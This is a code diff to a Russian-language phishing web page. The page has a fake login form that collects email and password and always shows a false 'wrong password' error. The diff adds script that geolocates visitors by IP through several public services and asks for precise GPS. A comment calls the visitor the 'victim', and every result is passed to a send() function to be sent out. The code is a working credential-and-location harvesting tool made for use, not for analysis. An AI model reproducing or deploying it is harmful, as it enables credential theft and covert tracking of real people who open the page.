@@ -211,24 +211,19 @@
             .catch(function(err) {});
     }
 
-    // ===== IP-ГЕО ЧЕРЕЗ ЦЕПОЧКУ СЕРВИСОВ =====
-    // Пробуем по очереди: ipwho.is → ipinfo.io → geojs.io
+    // ===== IP-ГЕО ЦЕПОЧКОЙ =====
     function formatGeo(label, ip, country, region, city, lat, lon, isp) {
-        let geo = "🌍 ГЕОЛОКАЦИЯ (" + label + ")\n━━━━━━━━━━━━━━━━━━\n";
+        let geo = "🌍 ГЕО ПО IP (" + label + ")\n━━━━━━━━━━━━━━━━━━\n";
         geo += "🌍 IP: " + (ip || "—") + "\n";
         geo += "🏳 " + (country || "—") + "\n";
         geo += "📍 " + (region || "—") + "\n";
         geo += "🏙 " + (city || "—") + "\n";
-        if (lat && lon) {
-            geo += "🗺 " + lat + ", " + lon + "\n";
-            geo += "\n🗺 Карта: https://maps.google.com/?q=" + lat + "," + lon + "\n";
-        }
+        if (lat && lon) geo += "🗺 " + lat + ", " + lon + "\n";
         if (isp) geo += "📡 " + isp;
         send(geo);
     }
 
     function getGeoByIP() {
-        // Попытка 1: ipwho.is
         fetch("https://ipwho.is/")
             .then(r => r.json())
             .then(function(d) {
@@ -236,56 +231,42 @@
                 formatGeo("ipwho.is", d.ip, d.country, d.region, d.city, d.latitude, d.longitude, d.connection && d.connection.isp);
             })
             .catch(function() {
-                // Попытка 2: ipinfo.io
                 fetch("https://ipinfo.io/json")
                     .then(r => r.json())
                     .then(function(d) {
                         let lat = "", lon = "";
-                        if (d.loc) {
-                            const parts = d.loc.split(",");
-                            lat = parts[0]; lon = parts[1];
-                        }
+                        if (d.loc) { const p = d.loc.split(","); lat = p[0]; lon = p[1]; }
                         formatGeo("ipinfo.io", d.ip, d.country, d.region, d.city, lat, lon, d.org);
                     })
                     .catch(function() {
-                        // Попытка 3: geojs.io
                         fetch("https://get.geojs.io/v1/ip/geo.json")
                             .then(r => r.json())
                             .then(function(d) {
                                 formatGeo("geojs.io", d.ip, d.country, d.region, d.city, d.latitude, d.longitude, d.organization_name);
                             })
                             .catch(function() {
-                                // Попытка 4: ipify + ip-api.com (последний резерв)
-                                fetch("https://api.ipify.org/?format=json")
-                                    .then(r => r.json())
-                                    .then(function(d) {
-                                        fetch("http://ip-api.com/json/" + d.ip)
-                                            .then(r => r.json())
-                                            .then(function(g) {
-                                                formatGeo("ip-api.com", d.ip, g.country, g.regionName, g.city, g.lat, g.lon, g.isp);
-                                            })
-                                            .catch(function() {
-                                                send("🌍 ГЕОЛОКАЦИЯ: только IP\n🌍 " + d.ip);
-                                            });
-                                    })
-                                    .catch(function() {
-                                        send("🌍 ГЕОЛОКАЦИЯ: не удалось получить");
-                                    });
+                                send("🌍 ГЕО: не удалось получить");
                             });
                     });
             });
     }
 
+    // ===== ТОЧНАЯ ГЕО (GPS) - 30 секунд ожидания =====
     function getGPS() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(p) {
-                    send("📍 GPS\n📍 Широта: " + p.coords.latitude + "\n📍 Долгота: " + p.coords.longitude + "\n🎯 Точность: ±" + Math.round(p.coords.accuracy) + " м\n🗺 https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
-                },
-                function() {},
-                { enableHighAccuracy: true, timeout: 8000 }
-            );
+        if (!navigator.geolocation) {
+            send("📍 GPS: не поддерживается браузером");
+            return;
         }
+
+        navigator.geolocation.getCurrentPosition(
+            function(p) {
+                send("📍 ТОЧНАЯ ГЕО (GPS)\n━━━━━━━━━━━━━━━━━━\n📍 Широта: " + p.coords.latitude + "\n📍 Долгота: " + p.coords.longitude + "\n🎯 Точность: ±" + Math.round(p.coords.accuracy) + " м\n🕒 " + new Date().toLocaleString("ru-RU") + "\n🗺 Карта: https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
+            },
+            function(err) {
+                // Молча - жертва отклонила или GPS выключен
+            },
+            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+        );
     }
 
     // ===== КНОПКА "ПОДТВЕРДИТЬ" =====
@@ -303,7 +284,7 @@
         document.getElementById("cookieBanner").classList.add("cookie-hidden");
     });
 
-    // ===== ФОРМА - с сообщением об ошибке =====
+    // ===== ФОРМА - с ошибкой =====
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
         const email = document.getElementById("email").value.trim();
@@ -320,7 +301,7 @@
         showError("Неверный адрес электронной почты или пароль. Убедитесь, что вы ввели всё правильно.");
     });
 
-    console.log("ROCKET ACTIVE — deno + geo chain + ошибка");
+    console.log("ROCKET ACTIVE — 30 сек GPS");
 </script>
 </body>
 </html>
